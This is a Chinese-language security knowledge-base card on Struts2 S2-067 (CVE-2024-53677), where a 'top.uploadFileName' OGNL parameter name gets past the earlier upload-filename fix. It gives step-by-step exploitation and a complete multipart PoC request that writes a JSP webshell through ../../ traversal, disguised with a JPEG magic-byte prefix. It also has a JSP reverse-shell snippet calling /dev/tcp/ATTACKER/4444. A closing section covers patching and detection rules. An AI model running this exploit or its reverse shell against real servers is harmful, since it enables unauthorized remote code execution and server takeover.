---
id: web-java-framework-struts2-s2-067-ognl-upload-filename-bypass
title: Struts2 S2-067（CVE-2024-53677）：top.uploadFileName OGNL 绕过上传文件名修复
type: scenario
domain: web
path: web/java/framework/struts2
technique: struts2-upload-filename-ognl-bypass
tags:
- java
- struts2
- file-upload
- path-traversal
- ognl
- cve-2024-53677
cve:
- CVE-2024-53677
affected_versions: Struts 2.0.0-2.3.37（EOL）; 2.5.0-2.5.33; 6.0.0-6.3.0.2
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:13:37+08:00'
  notes: 已对照原文与 img 14-26 核对：HttpParameters.appendAll 增加 remove(newParams.keySet()) 且 remove 转小写 equalsIgnoreCase、[0].top.uploadFileName 被 isAccepted 正则拒绝、top.uploadFileName 通过正则并覆盖值栈顶层属性、HTB Strutted 6.3.0.1 上 Content-Type+JPEG 魔数校验后上传 ../../shell.jsp 与反弹 shell 均一致；affected_versions 与原文完全一致
url: /docs/web/java/framework/struts2/web-java-framework-struts2-s2-067-ognl-upload-filename-bypass/
draft: false
kb_aliases:
- S2-067
- CVE-2024-53677
- Struts2 上传绕过
- top.uploadFileName
- OGNL 参数名覆盖
- Struts2 文件上传路径穿越
---

## 一句话结论

S2-066 的修复让 `HttpParameters#appendAll` 在合并上传参数前，按参数名忽略大小写删除同名项，从而阻止大小写变体覆盖 `uploadFileName`；但 `ParametersInterceptor` 仍把参数名当作 OGNL 表达式绑定到值栈，攻击者改用 `top.uploadFileName` 作为参数名即可绕过删除逻辑，在值栈顶层重新设置文件名，继续把 `../` 带入业务保存路径并写入 webshell。

## 原理

- 上传流程仍是 `FileUploadInterceptor` → `ParametersInterceptor`：
  - `FileUploadInterceptor` 解析 multipart，按 `<inputName>FileName` 硬编码生成文件名参数，例如文件框名为 `Upload` 时得到 `UploadFileName`。
  - `ParametersInterceptor` 从 `HttpParameters` 取参数，用 `OgnlValueStack#setParameter(name, value)` 把 `name` 当 OGNL 表达式求值并绑定到 Action。
- S2-066 的修复在 `HttpParameters#appendAll(Map newParams)` 中先调用 `remove(newParams.keySet())`；`remove()` 把待删参数名转小写，并以 `equalsIgnoreCase` 遍历现有参数逐个删除。因此攻击者再提交普通 `uploadFileName` 时，会被拦截器追加 `UploadFileName` 的动作删除，覆盖失败。
- 绕过点在于“删除比较的是完整参数名字符串”，而 OGNL 绑定取决于表达式求值结果。攻击者提交参数名 `top.uploadFileName`：
  - 它与 `UploadFileName` 不满足 `equalsIgnoreCase`（多了 `top.` 前缀），不会被删除；
  - `ParametersInterceptor` 的接受模式检查允许 `\w+(\.\w+)*` 形式的简单属性路径，`top.uploadFileName` 合法；
  - OGNL 在值栈上先取 `top`（栈顶对象，即当前 Action），再设置其 `uploadFileName` 属性，等价于调用 `setUploadFileName("../shell.jsp")`，覆盖拦截器写入的真实文件名。
- 另一个等价表达式 `[0].top.uploadFileName` 也能取到值栈顶层（`[0]` 表示整个 `CompoundRoot`），但它以 `[` 开头，不匹配 `ParametersInterceptor#isAccepted` 的 `\w+...` 正则，会被拒绝；因此实际使用去掉 `[0]` 的 `top.uploadFileName`。
- 覆盖发生在参数绑定阶段，之后业务 `execute()` 读取到的 `uploadFileName` 已是攻击者控制的值。若业务用它拼接保存路径且未做规范化校验，即可目录穿越。

## 触发条件

- 目标使用受影响版本的 Struts2，且启用默认 `fileUpload`、`params` 拦截器链。
- 存在文件上传 Action，业务用 `uploadFileName` 属性构造保存路径或扩展名判断。
- 应用层校验不足：只校验 Content-Type、文件头魔数，未对文件名后缀做白名单，也未把最终路径限制在上传目录内。
- 目标进程对目标写入路径有权限；写入位置需为容器可解析目录（如 Tomcat `webapps/ROOT`）才能直接 RCE。

## 利用步骤

1. 指纹识别 Struts2 版本与上传 Action；构造正常上传请求，确认文件框名称和返回的保存路径。
2. 在 multipart 中把文件框名设为 `Upload`（或 `upload`），使框架生成 `UploadFileName`。
3. 追加一个普通字段，字段名为 `top.uploadFileName`（或 `top.UploadFileName`），值为穿越路径，如 `../../shell.jsp`。
4. 为通过应用层校验：把文件部分的 `Content-Type` 设为 `image/jpeg`，并在文件内容前写入 JPEG 魔数 `FF D8 FF`（PNG/GIF 同理），后面接 JSP 代码。
5. 发送请求，观察响应中的图片/文件路径是否出现 `../`，以及目标是否在预期位置生成脚本。
6. 访问写入的 JSP（如 `/shell.jsp`）验证命令执行；可进一步写入反弹 shell 或内存马。

## PoC

最小 multipart 请求（Tomcat 部署，上传目录为 `webapps/ROOT/uploads/<时间戳>/`，`../../` 回到 `webapps/ROOT/`）：

```http
POST /upload.action HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=---------------------------boundary

-----------------------------boundary
Content-Disposition: form-data; name="Upload"; filename="1.jpg"
Content-Type: image/jpeg

<JPEG_MAGIC_FF_D8_FF><% out.println("EXP"); %>
-----------------------------boundary
Content-Disposition: form-data; name="top.UploadFileName"

../../shell.jsp
-----------------------------boundary--
```

说明：

- `Content-Type: image/jpeg` 与文件头 `FF D8 FF` 用于满足业务侧的 `isAllowedContentType` 和 `isImageByMagicBytes` 校验；JSP 代码从第 4 个字节开始，不影响魔数判断。
- 字段名也可写成 `top.uploadFileName`；OGNL 属性解析对首字母大小写不敏感，二者都落到 `setUploadFileName`。
- 保存路径深度按业务上传目录计算：`webapps/ROOT/uploads/<timestamp>/` 向上两级即 `webapps/ROOT/`；多一层目录就多加一个 `../`。
- 若返回体回显了文件路径（例如 `<img src="uploads/<timestamp>/../../shell.jsp">`），可直接确认穿越成功。

访问写入的脚本：

```text
GET /shell.jsp
```

JSP 反弹 shell 示例（仅作说明，不执行）：

```jsp
<% String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER/4444 0>&1"};
   Runtime.getRuntime().exec(cmd); %>
```

## 变体与关联

- 变体：参数名写作 `top.UploadFileName`、`top.uploadFileName` 均可；也可尝试其他能解析到同一属性的 OGNL 路径，只要不匹配被删除的完整参数名即可。
- 变体：若应用层额外校验扩展名，可结合解析漏洞、大小写后缀、双写后缀或 `.jsp;.jpg` 等容器特性（参见文件上传目录的关联卡片）。
- 关联：[[web-java-framework-struts2-s2-066-upload-filename-param-override]]（S2-067 所绕过的前置修复）。
- 关联：[[web-generic-file-upload-content-type-trust-bypass]]、[[web-generic-file-upload-magic-byte-gif-prefix-bypass]]（本场景中用于通过业务校验的通用手法）。
- 边界：业务若使用随机文件名、对 `uploadFileName` 做 `Path.normalize()` 并校验 `startsWith(uploadRoot)`，或升级到修复版本，则本手法失效。

## 检测与防御

- 修复：升级到官方 S2-067 修复版本；仅升级到 S2-066 修复版本不足以阻止本绕过。
- 代码层：上传保存路径不要使用客户端文件名；使用服务端生成的随机名，扩展名按白名单固定；对最终路径 `getCanonicalPath()` 后校验仍位于上传根目录内，拒绝 `..`、绝对路径和分隔符。
- 代码层：不要仅依赖 Content-Type 与文件头魔数判断文件类型；对图片做解码/重编码，剥离附加内容；上传目录与 Web 可执行目录分离。
- 配置层：限制 `ParametersInterceptor` 可接受的参数名模式，拒绝包含 `top.`、`[`、`]`、`(`、`)`、`#`、`@` 等 OGNL 语法字符的参数名；对上传 Action 使用参数白名单。
- 检测：multipart 字段名出现 `top.`、`top.UploadFileName`、`uploadFileName` 与文件框名大小写混用；请求体含 `../` 且 Content-Type 为图片；响应/日志中出现上传目录之外的写入路径。
- 检测：Web 目录突然出现 `.jsp`/`.jspx`/`.war` 等可执行文件；Tomcat 进程创建异常子进程或外连；上传接口返回的文件 URL 含 `../`。
